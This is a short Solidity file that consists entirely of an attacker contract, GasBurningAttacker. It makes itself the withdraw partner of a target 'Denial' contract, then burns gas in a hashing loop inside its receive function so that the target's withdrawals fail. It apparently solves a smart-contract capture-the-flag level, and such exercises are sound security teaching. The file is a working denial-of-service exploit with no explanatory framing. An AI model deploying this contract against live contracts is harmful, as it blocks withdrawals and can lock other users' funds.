pragma solidity ^0.8.0;

interface Denial {
    function setWithdrawPartner(address _partner) external;
}


contract GasBurningAttacker {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
        Denial(_denial).setWithdrawPartner(address(this));
    }

    receive() external payable {
        uint256 gasLeft = gasleft();
        // Exhaust gas with a loop
        for (uint256 i = 0; i < 100000; i++) {
            uint256(keccak256(abi.encodePacked(i, gasLeft)));
        }
    }
}
